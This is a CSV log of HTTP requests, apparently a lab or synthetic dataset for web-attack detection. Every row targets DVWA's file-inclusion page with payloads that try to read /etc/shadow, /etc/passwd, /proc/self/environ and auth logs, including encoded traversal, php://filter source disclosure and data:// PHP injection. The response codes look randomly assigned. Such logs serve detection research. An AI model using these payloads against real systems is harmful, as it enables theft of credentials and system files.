timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-12-24T07:08:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.674,10,4,19,0,200,1589
2025-12-24T07:08:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.572,10,4,27,0,403,2689
2025-12-24T07:08:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.943,10,4,27,0,200,3346
2025-12-24T07:08:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.81,10,4,19,0,500,3525
2025-12-24T07:08:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.992,13,4,24,0,403,4654
2025-12-24T07:09:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.865,10,4,27,0,200,1275
2025-12-24T07:09:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.974,10,4,27,0,200,1464
2025-12-24T07:09:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.339,13,4,24,0,403,795
2025-12-24T07:09:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.64,10,4,19,0,200,3273
2025-12-24T07:09:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.18,13,4,24,0,500,3676
2025-12-24T07:09:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.324,13,4,36,0,403,3855
2025-12-24T07:09:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.273,3,4,18,0,500,2883
2025-12-24T07:09:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.736,10,4,27,0,500,2665
2025-12-24T07:09:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.145,9,4,53,0,200,1938
2025-12-24T07:09:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.753,15,4,28,0,403,3813
2025-12-24T07:10:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.671,10,4,27,0,403,368
2025-12-24T07:10:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.732,9,4,53,0,403,404
2025-12-24T07:10:16Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.705,13,4,36,0,403,1052
2025-12-24T07:10:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.532,13,4,36,0,403,2900
2025-12-24T07:10:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.864,13,4,36,0,403,672
2025-12-24T07:10:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.645,3,4,18,0,500,2177
2025-12-24T07:10:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.244,13,4,22,0,403,4587
2025-12-24T07:10:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.567,3,4,18,0,200,1154
2025-12-24T07:10:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.523,15,4,28,0,200,1856
2025-12-24T07:10:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.79,13,4,36,0,200,1023
2025-12-24T07:11:04Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.242,13,4,36,0,500,1080
2025-12-24T07:11:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.053,10,4,19,0,500,4029
2025-12-24T07:11:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.146,3,4,18,0,500,2798
2025-12-24T07:11:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.329,10,4,19,0,500,1006
2025-12-24T07:11:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.788,13,4,22,0,200,1499
2025-12-24T07:11:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.73,10,4,35,0,403,4550
2025-12-24T07:11:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.632,10,4,27,0,403,3128
2025-12-24T07:11:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.788,9,4,53,0,500,4011
2025-12-24T07:11:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.975,15,4,28,0,403,679
2025-12-24T07:11:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.883,13,4,22,0,500,4276
2025-12-24T07:12:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.455,9,4,53,0,200,3305
2025-12-24T07:12:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.953,3,4,18,0,200,2214
2025-12-24T07:12:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.348,3,4,18,0,200,2930
2025-12-24T07:12:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.397,9,4,53,0,200,1512
2025-12-24T07:12:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.922,13,4,24,0,500,2535
2025-12-24T07:12:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.119,3,4,18,0,200,4501
2025-12-24T07:12:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.238,15,4,28,0,500,3665
2025-12-24T07:12:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.099,13,4,36,0,403,784
2025-12-24T07:12:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.652,9,4,53,0,200,3663
2025-12-24T07:12:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.17,13,4,36,0,403,3517
2025-12-24T07:13:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.56,13,4,24,0,500,2900
2025-12-24T07:13:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.253,10,4,19,0,500,4732
2025-12-24T07:13:16Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.648,13,4,36,0,200,3400
2025-12-24T07:13:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.401,13,4,24,0,500,537
2025-12-24T07:13:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.29,9,4,53,0,500,647
2025-12-24T07:13:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.97,10,4,35,0,200,4168
2025-12-24T07:13:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.797,13,4,24,0,500,3738
2025-12-24T07:13:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.579,10,4,19,0,403,3433
2025-12-24T07:13:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.606,10,4,19,0,403,4492
2025-12-24T07:13:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.892,10,4,27,0,403,4590
2025-12-24T07:14:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.161,15,4,28,0,500,451
2025-12-24T07:14:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.16,10,4,35,0,500,4330
2025-12-24T07:14:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.681,9,4,53,0,403,3235
2025-12-24T07:14:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.204,15,4,28,0,200,2344
2025-12-24T07:14:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.727,10,4,19,0,200,2414
2025-12-24T07:14:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.003,13,4,24,0,200,2064
2025-12-24T07:14:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.947,3,4,18,0,200,4023
2025-12-24T07:14:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.911,15,4,28,0,500,4147
2025-12-24T07:14:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.949,13,4,36,0,200,4416
2025-12-24T07:14:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.089,10,4,19,0,200,654
2025-12-24T07:15:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.077,13,4,24,0,403,4728
2025-12-24T07:15:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.166,13,4,22,0,403,2901
2025-12-24T07:15:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.819,9,4,53,0,200,1043
2025-12-24T07:15:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.611,13,4,24,0,200,3022
2025-12-24T07:15:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.342,13,4,24,0,200,2702
2025-12-24T07:15:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.835,9,4,53,0,403,1921
2025-12-24T07:15:40Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.313,13,4,36,0,403,3698
2025-12-24T07:15:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.925,15,4,28,0,500,2333
2025-12-24T07:15:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.901,13,4,36,0,500,2676
2025-12-24T07:15:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.259,15,4,28,0,500,469
2025-12-24T07:16:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.891,10,4,27,0,403,4492
2025-12-24T07:16:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.282,15,4,28,0,200,3541
2025-12-24T07:16:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.779,13,4,24,0,403,4026
2025-12-24T07:16:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.16,3,4,18,0,403,1408
2025-12-24T07:16:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.084,13,4,36,0,200,3587
2025-12-24T07:16:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.62,13,4,22,0,200,3424
2025-12-24T07:16:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.918,13,4,22,0,200,1671
2025-12-24T07:16:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.11,10,4,27,0,403,2546
2025-12-24T07:16:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.043,13,4,24,0,200,3771
2025-12-24T07:16:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.734,13,4,36,0,500,2255
2025-12-24T07:17:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.86,9,4,53,0,403,4083
2025-12-24T07:17:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.444,10,4,35,0,403,2120
2025-12-24T07:17:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.828,10,4,19,0,200,3020
2025-12-24T07:17:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.923,13,4,36,0,500,2652
2025-12-24T07:17:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.181,3,4,18,0,403,1673
2025-12-24T07:17:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.573,10,4,19,0,500,255
2025-12-24T07:17:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.662,10,4,27,0,200,3837
2025-12-24T07:17:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.698,10,4,27,0,403,1880
2025-12-24T07:17:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.542,3,4,18,0,500,2654
2025-12-24T07:17:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.584,13,4,24,0,500,2511
2025-12-24T07:18:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.596,13,4,22,0,200,1001
2025-12-24T07:18:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.849,3,4,18,0,500,2276
2025-12-24T07:18:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.42,10,4,19,0,200,394
2025-12-24T07:18:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.545,3,4,18,0,200,2389
2025-12-24T07:18:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.769,3,4,18,0,403,964
2025-12-24T07:18:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.925,9,4,53,0,500,4167
